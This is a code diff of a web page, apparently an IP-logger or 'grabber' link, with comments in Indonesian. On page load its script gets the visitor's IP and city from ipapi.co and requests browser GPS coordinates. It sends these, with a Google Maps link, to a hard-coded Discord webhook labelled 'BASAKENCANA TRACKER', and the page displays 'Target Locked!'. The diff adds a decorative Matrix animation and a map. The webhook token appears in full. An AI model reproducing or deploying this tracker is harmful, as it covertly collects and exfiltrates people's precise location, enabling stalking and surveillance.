@@ -24,23 +24,54 @@
 </div>
 
 <canvas id="matrix"></canvas>
+
 <script>
-// Webhook Baru
 const webhookURL = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
 
+// --- ANIMASI MATRIKS ---
+const canvas = document.getElementById('matrix');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+const letters = "01010101";
+const fontSize = 16;
+const columns = canvas.width / fontSize;
+const drops = Array(Math.floor(columns)).fill(1);
+
+function drawMatrix() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; 
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#0F0"; 
+    ctx.font = fontSize + "px monospace";
+    drops.forEach((y, i) => {
+        const text = letters[Math.floor(Math.random() * letters.length)];
+        ctx.fillText(text, i * fontSize, y * fontSize);
+        if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+    });
+}
+setInterval(drawMatrix, 40);
+
+// --- PELACAK & DISCORD ---
 async function trackVisitor() {
     try {
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
+        
+        document.getElementById('status').innerText = "Target Locked!";
+        document.getElementById('ip').innerText = "IP: " + data.ip;
+        document.getElementById('location').innerText = "Loc: " + data.city;
 
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                
-                // Gunakan backtick ( ` ) bukan kutip biasa ( ' )
+                // PERBAIKAN: Menggunakan ${} agar link tidak rusak
                 const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 
+                var map = L.map('map').setView([lat, lon], 15);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                L.marker([lat, lon]).addTo(map).bindPopup("Lokasi Akurat").openPopup();
+
                 await sendToDiscord(data, mLink, "🎯 GPS (PRESISI)");
             }, async () => {
                 const mLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
@@ -51,26 +82,16 @@ async function trackVisitor() {
 }
 
 async function sendToDiscord(data, mapsLink, metode) {
-    // Format JSON yang paling simpel untuk teks biasa + emoticon
     const payload = {
         username: "BASAKENCANA TRACKER",
-        content: `🚨 **PENGUNJUNG TERDETEKSI!**\n━━━━━━` + `━━━━━━━━\n` +
-                 `🌐 **IP Address:** ${data.ip}\n` +
-                 `🏙️ **Kota:** ${data.city}, ${data.region}\n` +
-                 `🎯 **Metode:** ${metode}\n` +
-                 `🗺️ **Google Maps:** [Klik di Sini](${mapsLink})\n` + 
-                 `━━━━━━━━━━` + `━━━━━━━━`
+        content: `🚨 **PENGUNJUNG TERDETEKSI!**\n🌐 **IP:** ${data.ip}\n🏙️ **Kota:** ${data.city}\n🎯 **Metode:** ${metode}\n🗺️ **Maps:** ${mapsLink}`
     };
 
-    // Mengirim ke Discord
-    try {
-        await fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-        console.log("Notifikasi Terkirim ke Discord!");
-    } catch (e) { console.error("Gagal mengirim ke Discord:", e); }
+    await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    });
 }
 
 trackVisitor();
